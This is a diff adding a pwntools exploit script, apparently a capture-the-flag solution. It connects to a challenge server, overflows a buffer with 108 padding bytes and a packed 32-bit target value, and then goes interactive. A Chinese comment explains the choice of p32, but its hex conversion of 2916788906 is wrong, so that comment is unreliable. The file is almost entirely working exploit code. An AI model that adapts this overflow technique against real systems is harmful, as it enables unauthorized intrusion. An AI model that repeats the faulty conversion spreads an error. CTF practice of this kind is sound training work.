@@ -1,0 +1,18 @@
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "debug"
+
+io = remote("challenge.bluesharkinfo.com",25114)  
+
+target = 2916788906      
+
+payload  = b"A" * (27*4)    
+payload += p32(target)       
+
+io.sendlineafter(b"do you like blueshark?", payload)
+
+io.interactive()
+
+
+因为是int所以是四字节，将 2916788906改为16进制是AA 0B D0 AD四字节就是p32，要是p64就是会提前遇到/x00提前截至反正不好（好吧，其实64位也可以）
